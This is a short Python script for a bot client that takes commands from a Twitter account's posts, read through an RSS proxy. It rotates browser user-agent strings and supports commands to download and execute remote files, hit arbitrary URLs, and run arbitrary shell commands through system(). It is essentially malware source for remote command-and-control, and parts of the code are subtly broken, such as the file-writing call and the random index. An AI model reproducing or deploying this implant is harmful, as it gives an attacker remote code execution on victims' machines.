#Thnx, to twitrss.me service!

import requests
from time import sleep
from os import system
from re import search
from random import randint

twitter_user = ""
prev_command = ""
ua_strings = ['Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; he-il; SAMSUNG SM-G900X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.6 Chrome/28.0.1500.94 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2483.0 Safari/537.36']

def retHeaders():
    header = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'accept-encoding': 'gzip, deflate, br',
        'dnt': "1",
        'User-Agent': ua_strings[randint(1, len(ua_strings))],  
        }
    
    return header

def getTask():
    global prev_command

    r = requests.get("https://twitrss.me/twitter_user_to_rss/?user="+twitter_user, headers=retHeaders())

    tmp = r.text.split("\n")
    tmp = tmp[len(tmp)-12]
    tmp = tmp.replace("      <title>", "")
    tmp = tmp.replace("</title>", "")

    if tmp != prev_command:
        prev_command = tmp
        return tmp
    else:
        return ""

def DownloadAndExecute(site, agr):
    r = requests.get(site, allow_redirects=True)
    ext = search("([^\/]+)(?=$)", site)
    open(ext, "wb", r.text)

    if agr != "":
        system("./"+ext+" "+agr)
    else:
        system("./"+ext)

while True:
    tmp = getTask().split("||")

    if tmp[0] == "d&e":
        DownloadAndExecute(tmp[1], "")
    elif tmp[0] == "o_s":
        requests.get(tmp[1], headers=retHeaders(), allow_redirects=True)
    elif tmp[0] == "de&agr":
        DownloadAndExecute(tmp[1],tmp[2])
    elif tmp[0] == "sys":
        system(tmp[1])

    sleep(60)